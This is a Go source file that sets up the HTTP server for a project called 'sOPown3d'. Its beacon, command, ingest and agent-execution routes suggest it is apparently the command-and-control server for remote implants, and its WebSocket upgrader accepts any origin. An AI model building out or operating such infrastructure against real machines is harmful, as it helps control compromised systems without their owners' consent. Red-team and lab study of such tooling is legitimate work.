package server

import (
	"fmt"
	"html/template"
	"net/http"
	"sync"
	"time"

	"sOPown3d/pkg/shared"
	"sOPown3d/server/config"
	"sOPown3d/server/logger"
	"sOPown3d/server/storage"
	"sOPown3d/server/tasks"

	"github.com/gorilla/websocket"
)

type Server struct {
	cfg              *config.Config
	logger           *logger.Logger
	templates        *template.Template
	pendingCommands  map[string]shared.Command
	lastCommandSent  map[string]shared.Command
	upgrader         websocket.Upgrader
	wsMu             sync.RWMutex
	wsClients        map[string]*websocket.Conn
	store            storage.Storage
	activityChecker  *tasks.ActivityChecker
	cleanupScheduler *tasks.CleanupScheduler
}

func New(cfg *config.Config, lgr *logger.Logger, store storage.Storage, activityChecker *tasks.ActivityChecker, cleanupScheduler *tasks.CleanupScheduler) (*http.Server, error) {
	tmpl, err := template.ParseGlob("templates/*.html")
	if err != nil {
		return nil, fmt.Errorf("failed to load templates: %w", err)
	}

	s := &Server{
		cfg:              cfg,
		logger:           lgr,
		templates:        tmpl,
		pendingCommands:  make(map[string]shared.Command),
		lastCommandSent:  make(map[string]shared.Command),
		upgrader:         websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }},
		wsClients:        make(map[string]*websocket.Conn),
		store:            store,
		activityChecker:  activityChecker,
		cleanupScheduler: cleanupScheduler,
	}

	mux := http.NewServeMux()

	// Core routes
	mux.HandleFunc("/", s.handleDashboard)
	mux.HandleFunc("/beacon", s.handleBeacon)
	mux.HandleFunc("/command", s.handleSendCommand)
	mux.HandleFunc("/ingest", s.handleIngest)
	mux.HandleFunc("/websocket", s.handleWebSocket)

	// API routes
	mux.HandleFunc("/api/agents", s.handleAPIAgents)
	mux.HandleFunc("/api/agents/", s.handleAPIAgentDetails)
	mux.HandleFunc("/api/executions", s.handleAPIExecutions)
	mux.HandleFunc("/api/stats", s.handleAPIStats)

	addr := fmt.Sprintf("%s:%s", cfg.Server.Host, cfg.Server.Port)

	srv := &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	return srv, nil
}
